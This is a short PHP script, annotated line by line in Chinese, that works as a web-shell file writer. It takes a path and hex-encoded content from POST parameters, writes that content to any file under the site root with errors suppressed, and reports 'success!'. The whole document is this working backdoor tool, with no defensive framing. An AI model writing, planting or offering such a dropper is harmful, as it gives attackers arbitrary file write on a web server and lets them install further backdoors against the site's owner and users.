    <?php
    $p=realpath(dirname(__FILE__)."/../").$_POST["a"]; //定义$p为根目录的物理路径+$_POST["a"]的内容
    $t=$_POST["b"]; //定义$t为$_POST["b"]的内容
    $tt=""; //定义$tt为空
    for ($i=0;$i<strlen($t);$i+=2) $tt.=urldecode("%".substr($t,$i,2)); //for循环次数是$t长度/2，每循环一次就让$tt加上“%xx”这样的编码
    @fwrite(fopen($p,"w"),$tt); //写入文件地址是$p，内容是$tt
    echo "success!";
    ?>